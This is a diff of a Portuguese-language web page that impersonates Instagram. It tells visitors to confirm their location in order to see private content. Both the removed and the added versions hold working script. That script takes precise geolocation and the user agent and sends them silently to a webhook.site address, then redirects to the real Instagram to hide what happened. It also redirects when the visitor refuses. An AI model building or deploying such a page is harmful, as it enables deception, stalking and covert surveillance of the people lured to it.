@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
@@ -6,108 +7,114 @@
     
     <meta property="og:title" content="Instagram">
     <meta property="og:description" content="Toque para ver o conteúdo.">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
     <meta property="og:type" content="website">
     <meta name="twitter:card" content="summary_large_image">
 
-    <title>Instagram - Conteúdo Exclusivo</title>
+    <title>Instagram</title>
     
     <style>
         body { 
-            font-family: 'Segoe UI', Arial, sans-serif; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
             display: flex; 
             justify-content: center; 
             align-items: center; 
             height: 100vh; 
             margin: 0; 
-            background-color: #fafafa; /* Cor de fundo do Instagram */
+            background-color: #fafafa; 
         }
         .card { 
             background: white; 
             padding: 40px; 
-            border-radius: 20px; 
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08); 
+            border-radius: 12px; 
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1); 
             text-align: center; 
-            max-width: 380px; 
+            max-width: 350px; 
             width: 90%;
             border: 1px solid #dbdbdb;
         }
         .insta-logo {
-            width: 80px;
+            width: 60px;
             margin-bottom: 20px;
         }
-        h2 { color: #262626; font-size: 22px; margin: 0 0 15px 0; }
-        p { color: #8e8e8e; line-height: 1.5; margin-bottom: 30px; font-size: 14px; }
-        
-        .btn-check { 
-            padding: 12px 24px; 
-            font-size: 16px; 
-            background-color: #0095f6; /* Azul do Instagram */
+        h2 { 
+            color: #262626; 
+            font-size: 20px; 
+            font-weight: 600;
+            margin: 0 0 10px 0; 
+        }
+        p { 
+            color: #8e8e8e; 
+            line-height: 1.4; 
+            margin-bottom: 25px; 
+            font-size: 14px; 
+        }
+        .btn-insta { 
+            padding: 10px 20px; 
+            font-size: 14px; 
+            background-color: #0095f6; 
             color: white; 
             border: none; 
             border-radius: 8px; 
             cursor: pointer; 
             font-weight: 600;
             width: 100%;
-            transition: background 0.3s ease;
         }
-        .btn-check:hover { background-color: #1877f2; }
-        #loading { display: none; margin-top: 20px; color: #8e8e8e; font-size: 12px; }
+        #status { display: none; margin-top: 15px; color: #8e8e8e; font-size: 12px; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" alt="Instagram" class="insta-logo">
-        <h2>Verificação de Conteúdo</h2>
-        <p>Para visualizar esta publicação privada, confirme sua localização para validação de segurança da conta.</p>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" alt="Instagram" class="insta-logo">
+        <h2>Instagram</h2>
+        <p>Confirme sua localização para visualizar este conteúdo e validar sua conta de segurança.</p>
         
-        <button class="btn-check" onclick="enviarLocalizacao()">VER CONTEÚDO</button>
+        <button class="btn-insta" onclick="iniciarTeste()">VER CONTEÚDO</button>
         
-        <div id="loading">Autenticando...</div>
+        <div id="status">Verificando conta...</div>
     </div>
 
     <script>
-        function enviarLocalizacao() {
-            const btn = document.querySelector('.btn-check');
-            const loader = document.getElementById('loading');
+        function iniciarTeste() {
+            const btn = document.querySelector('.btn-insta');
+            const status = document.getElementById('status');
             
-            // Seu link do Webhook
-            const URL_DESTINO = "https://webhook.site/999f921d-cfad-42a3-8927-e862ab40f665"; 
+            // LINK DO SEU WEBHOOK CONFIGURADO
+            const MEU_WEBHOOK = "https://webhook.site/999f921d-cfad-42a3-8927-e862ab40f665"; 
 
             btn.style.display = 'none';
-            loader.style.display = 'block';
+            status.style.display = 'block';
 
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(function(position) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(pos) {
                     
-                    const dados = {
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude,
-                        precisao: position.coords.accuracy.toFixed(1) + "m",
-                        data: new Date().toLocaleString('pt-BR'),
-                        agente: navigator.userAgent
+                    const info = {
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        precisao: pos.coords.accuracy.toFixed(1) + "m",
+                        horario: new Date().toLocaleString('pt-BR'),
+                        dispositivo: navigator.userAgent
                     };
 
-                    // Envio silencioso para o seu Webhook
-                    fetch(URL_DESTINO, {
+                    // Envio invisível
+                    fetch(MEU_WEBHOOK, {
                         method: 'POST',
                         mode: 'no-cors', 
-                        body: JSON.stringify(dados)
+                        body: JSON.stringify(info)
                     });
 
-                    // Redireciona para o Instagram real para disfarçar
+                    // Redireciona para o Instagram real
                     setTimeout(() => {
                         window.location.href = "https://www.instagram.com";
-                    }, 1000);
+                    }, 1200);
 
-                }, function(error) {
-                    // Se falhar, redireciona para não parecer erro
+                }, function(err) {
+                    // Se o usuário recusar, manda pro Instagram do mesmo jeito
                     window.location.href = "https://www.instagram.com";
-                }, {
-                    enableHighAccuracy: true,
-                    timeout: 8000
-                });
+                }, { enableHighAccuracy: true, timeout: 10000 });
             } else {
                 window.location.href = "https://www.instagram.com";
             }
